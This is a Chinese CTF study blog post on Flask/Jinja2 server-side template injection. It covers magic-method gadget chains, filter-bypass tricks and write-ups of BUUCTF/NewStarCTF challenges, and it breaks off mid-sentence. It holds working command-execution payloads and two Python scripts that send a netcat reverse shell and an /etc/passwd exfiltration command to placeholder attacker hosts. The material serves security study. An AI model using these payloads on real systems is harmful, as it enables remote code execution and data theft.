<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>ssti | have a good time!</title><meta name="author" content="mervin"><meta name="copyright" content="mervin"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="基础知识概要魔术方法1234567891011121314151617__base__——查看自己的父类,最终的父类一定是object__mro__——罗列显示所有的父类关系__mro__[]——显示那些罗列的第几个（从0开始）.__subclasses__()——这个类中有哪些子类.__subclasses__()[]——同__mro__的os._wrap_close——常用的模块（用来执行命令">
<meta property="og:type" content="article">
<meta property="og:title" content="ssti">
<meta property="og:url" content="http://example.com/2025/06/07/ssti/index.html">
<meta property="og:site_name" content="have a good time!">
<meta property="og:description" content="基础知识概要魔术方法1234567891011121314151617__base__——查看自己的父类,最终的父类一定是object__mro__——罗列显示所有的父类关系__mro__[]——显示那些罗列的第几个（从0开始）.__subclasses__()——这个类中有哪些子类.__subclasses__()[]——同__mro__的os._wrap_close——常用的模块（用来执行命令">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="https://p111223.github.io/imgs/2025-05-01%20005434.png">
<meta property="article:published_time" content="2025-06-07T12:24:10.000Z">
<meta property="article:modified_time" content="2025-11-27T03:54:49.503Z">
<meta property="article:author" content="mervin">
<meta property="article:tag" content="web">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://p111223.github.io/imgs/2025-05-01%20005434.png"><script type="application/ld+json">{
  "@context": "https://schema.org",
  "@type": "BlogPosting",
  "headline": "ssti",
  "url": "http://example.com/2025/06/07/ssti/",
  "image": "https://p111223.github.io/imgs/2025-05-01 005434.png",
  "datePublished": "2025-06-07T12:24:10.000Z",
  "dateModified": "2025-11-27T03:54:49.503Z",
  "author": [
    {
      "@type": "Person",
      "name": "mervin",
      "url": "http://example.com/"
    }
  ]
}</script><link rel="shortcut icon" href="/img/favicon.ico"><link rel="canonical" href="http://example.com/2025/06/07/ssti/index.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css"><script>
    (() => {
      
    const saveToLocal = {
      set: (key, value, ttl) => {
        if (!ttl) return
        const expiry = Date.now() + ttl * 86400000
        localStorage.setItem(key, JSON.stringify({ value, expiry }))
      },
      get: key => {
        const itemStr = localStorage.getItem(key)
        if (!itemStr) return undefined
        const { value, expiry } = JSON.parse(itemStr)
        if (Date.now() > expiry) {
          localStorage.removeItem(key)
          return undefined
        }
        return value
      }
    }

    window.btf = {
      saveToLocal,
      getScript: (url, attr = {}) => new Promise((resolve, reject) => {
        const script = document.createElement('script')
        script.src = url
        script.async = true
        Object.entries(attr).forEach(([key, val]) => script.setAttribute(key, val))
        script.onload = script.onreadystatechange = () => {
          if (!script.readyState || /loaded|complete/.test(script.readyState)) resolve()
        }
        script.onerror = reject
        document.head.appendChild(script)
      }),
      getCSS: (url, id) => new Promise((resolve, reject) => {
        const link = document.createElement('link')
        link.rel = 'stylesheet'
        link.href = url
        if (id) link.id = id
        link.onload = link.onreadystatechange = () => {
          if (!link.readyState || /loaded|complete/.test(link.readyState)) resolve()
        }
        link.onerror = reject
        document.head.appendChild(link)
      }),
      addGlobalFn: (key, fn, name = false, parent = window) => {
        if (!false && key.startsWith('pjax')) return
        const globalFn = parent.globalFn || {}
        globalFn[key] = globalFn[key] || {}
        globalFn[key][name || Object.keys(globalFn[key]).length] = fn
        parent.globalFn = globalFn
      }
    }
  
      
      const activateDarkMode = () => {
        document.documentElement.setAttribute('data-theme', 'dark')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
        }
      }
      const activateLightMode = () => {
        document.documentElement.setAttribute('data-theme', 'light')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
        }
      }

      btf.activateDarkMode = activateDarkMode
      btf.activateLightMode = activateLightMode

      const theme = saveToLocal.get('theme')
    
          theme === 'dark' ? activateDarkMode() : theme === 'light' ? activateLightMode() : null
        
      
      const asideStatus = saveToLocal.get('aside-status')
      if (asideStatus !== undefined) {
        document.documentElement.classList.toggle('hide-aside', asideStatus === 'hide')
      }
    
      
    const detectApple = () => {
      if (/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)) {
        document.documentElement.classList.add('apple')
      }
    }
    detectApple()
  
    })()
  </script><script>const GLOBAL_CONFIG = {
  root: '/',
  algolia: undefined,
  localSearch: undefined,
  translate: undefined,
  highlight: {"plugin":"highlight.js","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false,"highlightFullpage":false,"highlightMacStyle":true},
  copy: {
    success: '复制成功',
    error: '复制失败',
    noSupport: '浏览器不支持'
  },
  relativeDate: {
    homepage: false,
    post: false
  },
  runtime: '',
  dateSuffix: {
    just: '刚刚',
    min: '分钟前',
    hour: '小时前',
    day: '天前',
    month: '个月前'
  },
  copyright: undefined,
  lightbox: 'null',
  Snackbar: undefined,
  infinitegrid: {
    js: 'https://cdn.jsdelivr.net/npm/@egjs/infinitegrid/dist/infinitegrid.min.js',
    buttonText: '加载更多'
  },
  isPhotoFigcaption: false,
  islazyloadPlugin: false,
  isAnchor: false,
  percent: {
    toc: true,
    rightside: false,
  },
  autoDarkmode: false
}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
  title: 'ssti',
  isHighlightShrink: false,
  isToc: true,
  pageType: 'post'
}</script><meta name="generator" content="Hexo 7.3.0"></head><body><div id="web_bg" style="background-image: url(https://p111223.github.io/imgs/avatar-icon.png);"></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img text-center"><img src="/img/avatar-icon.png" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="site-data text-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">11</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">2</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">0</div></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> Home</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> Archives</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> Tags</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> Categories</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> Link</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> About</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url(https://p111223.github.io/imgs/2025-05-01 005434.png);"><nav id="nav"><span id="blog-info"><a class="nav-site-title" href="/"><img class="site-icon" src="https://p111223.github.io/imgs/2025-05-19 230655.png" alt="Logo"><span class="site-name">have a good time!</span></a><a class="nav-page-title" href="/"><span class="site-name">ssti</span></a></span><div id="menus"><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> Home</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> Archives</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> Tags</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> Categories</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> Link</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> About</span></a></div></div><div id="toggle-menu"><span class="site-page"><i class="fas fa-bars fa-fw"></i></span></div></div></nav><div id="post-info"><h1 class="post-title">ssti</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2025-06-07T12:24:10.000Z" title="发表于 2025-06-07 20:24:10">2025-06-07</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2025-11-27T03:54:49.503Z" title="更新于 2025-11-27 11:54:49">2025-11-27</time></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title=""><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">浏览量:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="container post-content" id="article-container"><h1 id="基础知识概要"><a href="#基础知识概要" class="headerlink" title="基础知识概要"></a>基础知识概要</h1><h2 id="魔术方法"><a href="#魔术方法" class="headerlink" title="魔术方法"></a>魔术方法</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">__base__——查看自己的父类,最终的父类一定是<span class="built_in">object</span></span><br><span class="line">__mro__——罗列显示所有的父类关系</span><br><span class="line">__mro__[]——显示那些罗列的第几个（从<span class="number">0</span>开始）</span><br><span class="line">.__subclasses__()——这个类中有哪些子类</span><br><span class="line">.__subclasses__()[]——同__mro__的</span><br><span class="line"></span><br><span class="line">os._wrap_close——常用的模块（用来执行命令）——怎么执行</span><br><span class="line">&#123;&#123;%<span class="number">27</span>%<span class="number">27.</span>__class__.__base__.__subclasses__()[<span class="number">117</span>].__init__.__globals__[%27popen%<span class="number">27</span>](%27cd%<span class="number">20.</span>./../../;ls%<span class="number">27</span>).read()&#125;&#125;——找popen类来执行命令+要读取</span><br><span class="line">【.__subclasses__()[对应序号]来进行调用】</span><br><span class="line">.__subclasses__()[对应序号].__init__——&gt;判断是否用重载，</span><br><span class="line">.__subclasses__()[对应序号].__init__.__globals__[<span class="string">&#x27;要调用的模块和命令&#x27;</span>]()</span><br><span class="line"></span><br><span class="line">__init__             初始化类，返回的类型是function</span><br><span class="line">__globals__          使用方式是 函数名.__globals__获取函数所处空间下可使用的module、方法以及所有变量。</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">__builtins__         内建名称空间，内建名称空间有许多名字到对象之间映射，而这些名字其实就是内建函数的名称，对象就是这些内建函数本身.——里面可能会有有用的模块eg：<span class="built_in">eval</span></span><br></pre></td></tr></table></figure>

<blockquote>
<p>[!NOTE]</p>
<p><strong>globals</strong>          使用方式是 函数名.__globals__获取函数所处空间下可使用的module、方法以及所有变量。<br>(获取的是字典，存储的是对象的引用，要用<code>[]</code>调用<code>(.get())</code>，如果键值是<code>&lt;function&gt;</code>，可以运行——要在后面加())！！！</p>
</blockquote>
<h2 id="相关类、模块"><a href="#相关类、模块" class="headerlink" title="相关类、模块"></a>相关类、模块</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">文件读取</span><br><span class="line">_frozen_importlib_external.FileLoader——模块</span><br><span class="line">.subclasses[][<span class="string">&quot;get_data&quot;</span>](<span class="number">0</span>,<span class="string">&quot;要读取的文件路径&quot;</span>)</span><br><span class="line"></span><br><span class="line">命令执行：</span><br><span class="line">内建函数<span class="built_in">eval</span>执行命令</span><br><span class="line">查看可用<span class="built_in">eval</span>的模块——.__globals__[<span class="string">&#x27;__builtins__&#x27;</span>]中找<span class="built_in">eval</span>字眼</span><br><span class="line"></span><br><span class="line">popen模块——__globals__[<span class="string">&#x27;popen&#x27;</span>](<span class="string">&#x27;&#x27;</span>).read()</span><br><span class="line"></span><br><span class="line">os模块执行命令——也是调用popen，方式看上图；查找时，实际是要“os.py”，在查找脚本上换成这个就ok</span><br><span class="line">__globals__+[<span class="string">&#x27;模块&#x27;</span>]/直接模块</span><br><span class="line">&#123;&#123;%<span class="number">27</span>%<span class="number">27.</span>__class__.__base__.__subclasses__()[<span class="number">127</span>].__init__.__globals__.popen(%27ls%<span class="number">27</span>).read()&#125;&#125;</span><br><span class="line"></span><br><span class="line">importlib:</span><br><span class="line">找_frozen_importlib.BuiltnImporter——内置模块加载机制的一部分，但我们要的是imporlib模块；然后使用load_module加载os</span><br><span class="line">eg:...__subclasses__()[][<span class="string">&quot;load_module&quot;</span>](<span class="string">&quot;os&quot;</span>)[<span class="string">&quot;popen&quot;</span>](<span class="string">&quot;命令&quot;</span>).read()</span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;在 Python 的早期版本中（Python 2.x 和部分 Python 3.x），模块加载器（如 BuiltinImporter）有一个 load_module 方法，用于加载模块。然而，从 Python 3.4 开始，load_module 方法已经被废弃，取而代之的是 importlib 模块中的 import_module 函数和 ModuleSpec 对象。&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">其他常见模块</span><br><span class="line">命令执行</span><br><span class="line"><span class="comment"># eval </span></span><br><span class="line">x[NUM].__init__.__globals__[<span class="string">&#x27;__builtins__&#x27;</span>][<span class="string">&#x27;eval&#x27;</span>](<span class="string">&#x27;__import__(&quot;os&quot;).popen(&quot;ls /&quot;).read()&#x27;</span>) </span><br><span class="line"></span><br><span class="line"><span class="comment"># os.py</span></span><br><span class="line">x[NUM].__init__.__globals__[<span class="string">&#x27;os&#x27;</span>].popen(<span class="string">&#x27;ls /&#x27;</span>).read()</span><br><span class="line"></span><br><span class="line"><span class="comment"># popen</span></span><br><span class="line">x[NUM].__init__.__globals__[<span class="string">&#x27;popen&#x27;</span>](<span class="string">&#x27;ls /&#x27;</span>).read()</span><br><span class="line"></span><br><span class="line"><span class="comment"># _frozen_importlib.BuiltinImporter</span></span><br><span class="line">x[NUM][<span class="string">&quot;load_module&quot;</span>](<span class="string">&quot;os&quot;</span>)[<span class="string">&quot;popen&quot;</span>](<span class="string">&quot;ls /&quot;</span>).read()</span><br><span class="line"></span><br><span class="line"><span class="comment"># linecache</span></span><br><span class="line">x[NUM].__init__.__globals__[<span class="string">&#x27;linecache&#x27;</span>][<span class="string">&#x27;os&#x27;</span>].popen(<span class="string">&#x27;ls /&#x27;</span>).read()</span><br><span class="line"></span><br><span class="line"><span class="comment"># subprocess.Popen</span></span><br><span class="line">x[NUM](<span class="string">&#x27;ls /&#x27;</span>,shell=<span class="literal">True</span>,stdout=-<span class="number">1</span>).communicate()[<span class="number">0</span>].strip()</span><br></pre></td></tr></table></figure>



<h2 id="无回显"><a href="#无回显" class="headerlink" title="无回显"></a>无回显</h2><p>1、反弹shell</p>
<p>rce</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;&quot;</span><span class="comment">#目标主机地址</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">300</span>)::</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        data = &#123;<span class="string">&quot;code&quot;</span>:<span class="string">&#x27;&#123;&#123;&quot;&quot;.__class__.__base__.__subclasses__()[&#x27;</span> + <span class="built_in">str</span>(i) + <span class="string">&#x27;].__init__.__globals__[&quot;popen&quot;](&quot;netcat xxx.xxx.xxx.xxx 7777 -e /bin/bash&quot;).read()&#125;&#125;&#x27;</span>&#125;</span><br><span class="line">        response = requests.post(url,data=data)</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line">        </span><br><span class="line"><span class="comment">#执行这个操作时，我们要监听本机：nc -lvp 7777 以便接收来自其他机器的连接</span></span><br></pre></td></tr></table></figure>

<p>2、带外注入</p>
<p>通过requestbin或dnslog的方式将信息传到外界</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;&quot;</span><span class="comment">#目标主机地址</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">300</span>)::</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        data = &#123;<span class="string">&quot;code&quot;</span>:<span class="string">&#x27;&#123;&#123;&quot;&quot;.__class__.__base__.__subclasses__()[&#x27;</span> + <span class="built_in">str</span>(i) + <span class="string">&#x27;].__init__.__globals__[&quot;popen&quot;](&quot;ul http://xxx.xxx.xxx.xxx/`cat /etc/passwd`&quot;).read()&#125;&#125;&#x27;</span>&#125;<span class="comment">#反引号，Linux</span></span><br><span class="line">        response = requests.post(url,data=data)</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line">        </span><br><span class="line"><span class="comment">#执行这个操作时，我们要开启一个Python http监听——python3 -m http.server 8000</span></span><br></pre></td></tr></table></figure>

<p>3、纯盲注</p>
<h2 id="绕过"><a href="#绕过" class="headerlink" title="绕过"></a>绕过</h2><p>过滤可以尝试着用十六进制来绕过</p>
<h3 id="绕过-限制WAF"><a href="#绕过-限制WAF" class="headerlink" title="绕过[]限制WAF"></a>绕过[]限制WAF</h3><p><code>__getitem___()</code>魔术方法，代替[]</p>
<p>对字典使用时，传入字符串，返回字典相应键所对应的值；</p>
<p>当对列表使用时，传入整数，返回列表对应索引的值。</p>
<p>也可以通过<code>.get()</code>实现绕过</p>
<p>——操作通上</p>
<style>.eaemetuhusir{zoom: 50%;}</style><img src="/2025/06/07/ssti/image-20251127111029500.png" class="eaemetuhusir" alt="image-20251127111029500">

<style>.dgxsljxbhdek{zoom: 50%;}</style><img src="/2025/06/07/ssti/image-20251127111559464.png" class="dgxsljxbhdek" alt="image-20251127111559464">  

<style>.fjrkobnpwtqo{zoom: 50%;}</style><img src="/2025/06/07/ssti/image-20251127111331641.png" class="fjrkobnpwtqo" alt="image-20251127111331641"> 

<h3 id="绕过单双引号"><a href="#绕过单双引号" class="headerlink" title="绕过单双引号"></a>绕过单双引号</h3><p>——指的是后面的参数部分，<code>__globals__[&#39;popen&#39;]</code>这个单引号</p>
<p>request——不是Python的函数，而是在flask内部的函数</p>
<p>request.args.key 获取get传入的key的值，+ 在url上补上参数key的内容(eg:popen)，下面的类似(最后一个是可变的，有多个，用&amp;分开）</p>
<p>url: …?key&#x3D;</p>
<p>——不用引号来包含</p>
<p>request.values.x1 所有参数</p>
<p>request.cookies 获取Cookie传入参数——多参数这里用;隔开</p>
<p>request.headers 获取请求头请求参数</p>
<p>request.from.key 获取post传入的key参数</p>
<p>（Content-Type:application&#x2F;x-www-form-urlencoded或multipart&#x2F;form-data）</p>
<p>request.data 获取post传入参数（Content-Type:a&#x2F;b）</p>
<p>request.json 获取post传入json参数（Content-Type:application&#x2F;json）</p>
<h3 id="下划线过滤"><a href="#下划线过滤" class="headerlink" title="下划线过滤"></a>下划线过滤</h3><p>1、过滤器通过管道符号(|)与变量连接，并且在括号中可能有可选的参数</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">flask常用过滤器：</span><br><span class="line"></span><br><span class="line">length():获取一个序列或字典的长度并将其返回</span><br><span class="line"></span><br><span class="line">int():将值转换成int类型</span><br><span class="line"></span><br><span class="line">float():将值转换成float类型</span><br><span class="line"></span><br><span class="line">lower():将字符串转换成小写</span><br><span class="line"></span><br><span class="line">upper():将字符串转换为大写</span><br><span class="line"></span><br><span class="line">reverse():反转字符串</span><br><span class="line"></span><br><span class="line">replace(value,old,new):将value中的old替换为new</span><br><span class="line"></span><br><span class="line">list():将变量转换成列表类型</span><br><span class="line"></span><br><span class="line">string():将变量（键值）转换成字符串类型</span><br><span class="line"></span><br><span class="line">join():将一个序列中的**参数值**拼接成字符串，或者通常有python内置的dict()配合使用(dict的话，是把键名合并，字典中只有一个键名也行)</span><br><span class="line"></span><br><span class="line">attr():获取对象的属性//()中是字符串</span><br></pre></td></tr></table></figure>

<blockquote>
<p>[!NOTE]</p>
<p><strong>混淆点</strong></p>
<p><code>join()</code>:将一个序列中的<strong>参数值</strong>拼接成字符串，或者通常有python内置的**<code>dict()</code>配合使用**(dict的话，是把键值合并)——获得的是字符串。由于attr要字符串，所以，可以通过这个来获取字符串)<br>eg:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&#123;% set cla=dict(c=a,l=a,a=a,ss=a)|join %&#125;//cla--class</span><br><span class="line">&#123;% set cl=(cla,dict(e=a,s=a)|join)|join&#125;//cl--classes</span><br><span class="line">**非`dict`组合的，只能是参数，想获得`classes`，不能直接`cl=(cla,ss,es)|join`**</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><code>attr()</code>:获取对象的属性——()中是<strong>字符串</strong><br>不能获得字典键值&#x2F;键名eg:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;os._wrap_close.__globals__|attr(&#x27;popen&#x27;)&#125;&#125; x,不是属性了</span><br><span class="line">&#123;&#123;os._wrap_close.__globals__|attr(&#x27;__getitem__&#x27;)(&#x27;popen&#x27;)(cmd).read()&#125;&#125;</span><br><span class="line">&#123;&#123;os._wrap_close.__globals__|attr(&#x27;get&#x27;)(&#x27;popen&#x27;)(cmd).read()&#125;&#125;</span><br><span class="line">--在__globals__中,popen是dict()，可以用来执行命令，但调用方式为[]，而不能用attr</span><br><span class="line">(&#x27;popen&#x27;:&#x27;&lt;function..&gt;&#x27;)</span><br><span class="line"></span><br><span class="line">而</span><br><span class="line">&#123;&#123;os._wrap_close.__globals__[&#x27;os&#x27;]|attr(&#x27;popen&#x27;)(&#x27;ls&#x27;).read&#125;&#125;--可以，因为[&#x27;os&#x27;]后，获得的是module了，而popen是这个module的属性(&lt;function&gt;)</span><br></pre></td></tr></table></figure>
</blockquote>
<p>对象|upper|lower –&gt; 先大写后小写，–&gt;最终还是小写</p>
<p><code>()|attr(&#39;__class__&#39;)</code> –&gt; 在根据上面的request –&gt; ()|attr(request.args.key)</p>
<p>().request.args.key——这样可以吗</p>
<p><code>__subclasses__()</code>——这个()放在{{}}中，而不是request.args.key中</p>
<p>2、可以从返回值那里拿_之类的字符</p>
<p><strong>|string|list——&gt;可以获得大量字符</strong></p>
<p><strong>+pop()——&gt;可以得到对应下标字符</strong></p>
<p><strong>+attr(pop)()</strong></p>
<p>具体利用看ssti的buu_[Dest0g3 520迎新赛]EasySSTI</p>
<p>chr()</p>
<p>ord()</p>
<p>dot()</p>
<h3 id="空格绕过"><a href="#空格绕过" class="headerlink" title="空格绕过"></a>空格绕过</h3><p><code>%0a</code> 是 URL 编码中表示换行符（LF，Line Feed）的编码。在某些编程语言和环境中，换行符可以被解析为逻辑上的分隔符，从而在某些情况下替代空格的功能。</p>
<p>某些模板引擎在解析模板字符串时，会将换行符视为逻辑上的分隔符，类似于空格的作用。</p>
<p>不行时，可以换成%09——&#x2F;t，制表符</p>
<p>eg：ls &#x2F;(ls%20&#x2F;)</p>
<p>–&gt;ls%0a&#x2F;换行了，即ls当前目录了（%0D%0A也是）</p>
<p>–&gt;ls%09</p>
<p>十六进制绕过魔术方法限制——同时用[‘’][‘’]。。。代替.</p>
<p>原因可能是：print(‘\x5f\x5f\x63\x6c\x61\x73\x73\x5f\x5f’)  # 输出: <strong>class</strong></p>
<h1 id="题目："><a href="#题目：" class="headerlink" title="题目："></a>题目：</h1><h2 id="buu-第三章-web进阶-SSTI"><a href="#buu-第三章-web进阶-SSTI" class="headerlink" title="buu_[第三章 web进阶]SSTI"></a>buu_[第三章 web进阶]SSTI</h2><p>!<img src="https://p111223.github.io/2025/06/07/ssti/1.png" alt="image-20250529214750168" style="zoom:50%;" /></p>
<p>应该是有个叫password的get参数</p>
<p>常规构造一个得到（找os._wrap_close，查globals）</p>
<p>!<img src="https://p111223.github.io/2025/06/07/ssti/2.png" alt="image-20250529214750168" style="zoom:50%;" /></p>
<p>同时，好像用命令查看server.py时，有另一个flag</p>
<p>!<img src="https://p111223.github.io/2025/06/07/ssti/3.png" alt="image-20250529214750168"  /></p>
<p>先试了后面的那个，通过了，前面的不知道。</p>
<h2 id="buu-NewStarCTF-公开赛赛道-BabySSTI-One"><a href="#buu-NewStarCTF-公开赛赛道-BabySSTI-One" class="headerlink" title="buu_[NewStarCTF 公开赛赛道]BabySSTI_One"></a>buu_[NewStarCTF 公开赛赛道]BabySSTI_One</h2><p>先<code>&#123;&#123;lipsum.__globals__&#125;&#125;</code></p>
<p>!<img src="https://p111223.github.io/2025/06/07/ssti/4.png" alt="image-20250529214750168" style="zoom:50%;" /></p>
<p>后!<img src="https://p111223.github.io/2025/06/07/ssti/5.png" alt="image-20250529214750168" style="zoom:50%;" /></p>
<p><code>name=&#123;&#123;lipsum.__globals__.__builtins__[%27__import__%27](%27os%27).popen(%27ls%20%27).read()&#125;&#125;</code></p>
<p>这样可以执行代码</p>
<p><code>?name=&#123;&#123;lipsum.__globals__.__builtins__.__import__(%27os%27).popen(%27ls%20/%27).read()&#125;&#125;</code></p>
<p>这样也可以</p>
<p>执行命令ls &#x2F;有</p>
<p>!<img src="https://p111223.github.io/2025/06/07/ssti/6.png" alt="image-20250529214750168" style="zoom:50%;" /></p>
<p>看flag_in_here出现!<img src="https://p111223.github.io/2025/06/07/ssti/7.png" alt="image-20250529214750168" style="zoom:50%;" /></p>
<p>应该是过滤了flag和cat</p>
<p>用tail &#x2F;f*（head、tac、nl、od——二进制、sort、uniq都行）</p>
<p>就行了</p>
<p>!<img src="https://p111223.github.io/2025/06/07/ssti/8.png" alt="image-20250529214750168" style="zoom:50%;" /></p>
<p>即<code>?name=&#123;&#123;lipsum.__globals__.__builtins__[%27__import__%27](%27os%27).popen(%27tail%20/f*%27).read()&#125;&#125;</code></p>
<p><code>?name=&#123;&#123;lipsum.__globals__.__builtins__.__import__(%27os%27).popen(%27tail%20/f*%27).read()&#125;&#125;也行</code></p>
<h2 id="buu-NewStarCTF-公开赛赛道-BabySSTI-Two"><a href="#buu-NewStarCTF-公开赛赛道-BabySSTI-Two" class="headerlink" title="buu_[NewStarCTF 公开赛赛道]BabySSTI_Two"></a>buu_[NewStarCTF 公开赛赛道]BabySSTI_Two</h2><p>过滤了空格和很多魔术方法</p>
<p>Eg:<code>__class__.__globals__.__builtins__。。。</code></p>
<p>所以</p>
<p>不用<code>.__。。。__</code></p>
<p>全用[‘。。。’]索引查找——&gt;可等效于.</p>
<p><code>?name=&#123;&#123;lipsum['__globals__']['__builtins__']\['__import__']('os').popen('more%09/f*').read()&#125;&#125;</code></p>
<p>即：</p>
<p><code>?name=&#123;&#123;lipsum[%27\x5f\x5f\x67\x6c\x6f\x62\x61\x6c\x73\x5f\x5f%27][%27\x5f\x5f\x62\x75\x69\x6c\x74\x69\x6e\x73\x5f\x5f%27][%27__import__%27](%27os%27)[%27po\x70en%27](%27more%09/f*%27).read()&#125;&#125;</code></p>
<p>输入命令为：</p>
